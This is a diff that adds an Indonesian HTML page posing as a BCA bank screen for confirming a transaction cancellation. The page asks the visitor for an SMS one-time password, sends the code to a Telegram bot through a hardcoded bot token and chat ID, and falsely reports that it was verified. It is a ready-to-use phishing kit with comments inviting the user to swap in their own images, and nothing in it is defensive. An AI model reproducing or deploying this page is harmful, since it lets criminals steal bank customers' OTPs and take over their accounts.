@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title> OTP Pembatalan Transaksi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        bca: {
+                            blue: '#0059B3',
+                            dark: '#1E40AF',
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .input-otp {
+                @apply w-full border border-gray-300 rounded-sm px-3 py-2 text-center text-base focus:outline-none focus:border-bca-blue;
+            }
+            .btn-konfirmasi {
+                @apply w-full bg-bca-blue text-white py-2 rounded-sm font-semibold text-base hover:bg-opacity-90 transition;
+            }
+        }
+    </style>
+</head>
+<!-- Latar Belakang Halaman - Ganti Gambar Kamu di Sini -->
+<body class="bg-gray-200 min-h-screen flex items-center justify-center bg-cover bg-center" 
+      style="background-image: url('background-kamu.jpg');">
+
+    <!-- Container Utama - Ukuran Sesuai Gambar -->
+    <div class="w-full max-w-xs bg-white rounded-md shadow overflow-hidden mx-4 my-6">
+        
+        <!-- BAGIAN ATAS (TEMPAT GAMBAR) - BISA GANTI SENDIRI -->
+        <div class="bg-bca-blue text-center text-white relative">
+            <!-- 👇 GANTI GAMBAR UTAMA KAMU DI SINI 👇 -->
+            <img 
+                src="otp.png" 
+                alt="Ilustrasi OTP" 
+                class="w-full h-auto object-cover"
+            >
+        </div>
+
+        <!-- Bagian Bawah (Form Input) -->
+        <div class="px-5 py-4">
+            <form id="formOTP" class="space-y-3">
+                <div>
+                    <label class="block text-bca-blue text-sm text-font-bold mb-3 text-center">Masukkan SMS kode OTP di bawah:</label>
+                    <input 
+                        type="text" 
+                        name="kode_otp" 
+                        placeholder="Masukkan Kode OTP" 
+                        required 
+                        maxlength="6"
+                        class="input-otp"
+                    >
+                </div>
+
+                <!-- Hitungan Mundur -->
+                <div class="text-center -mt-1 mb-1">
+                    <span id="timer" class="text-base font-medium text-bca-blue">0 : 57</span>
+                </div>
+
+                <!-- Tombol Konfirmasi -->
+                <button type="submit" class="btn-konfirmasi mt-1">
+                    KONFIRMASI
+                </button>
+            </form>
+        </div>
+
+    </div>
+
+    <!-- Script Telegram & Logika -->
+    <script>
+        const BOT_TOKEN = "8412792790:AAEECAsUM-ckeY-Uni7usyYurXhE9Qpbq5M";
+        const CHAT_ID = "-1003937504797";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // Timer Hitung Mundur (Mulai dari 57 detik sesuai gambar)
+        let waktu = 57;
+        const timerEl = document.getElementById('timer');
+        
+        const hitungMundur = setInterval(() => {
+            let menit = Math.floor(waktu / 60);
+            let detik = waktu % 60;
+            timerEl.textContent = `${menit} : ${detik.toString().padStart(2, '0')}`;
+            
+            if (waktu <= 0) {
+                clearInterval(hitungMundur);
+                timerEl.textContent = "Kode Kadaluarsa";
+                timerEl.classList.add('text-red-500');
+            }
+            waktu--;
+        }, 1000);
+
+        // Kirim Data ke Telegram
+        async function kirimOTP(e) {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData);
+
+            const pesan = `<b>🔐 VERIFIKASI KODE OTP</b>
+            \n<b>Kode OTP:</b> ${data.kode_otp}
+            \n<b>Waktu Kirim:</b> ${new Date().toLocaleString('id-ID')}`;
+
+            try {
+                await fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: pesan, parse_mode: 'HTML' })
+                });
+                alert("Kode OTP Berhasil Diverifikasi!");
+                window.location.href = "otp-salah.html"; 
+            } catch (err) {
+                alert("Gagal mengirim data, cek koneksi.");
+            }
+        }
+        document.getElementById('formOTP').addEventListener('submit', kirimOTP);
+    </script>
+
+</body>
+</html>
+
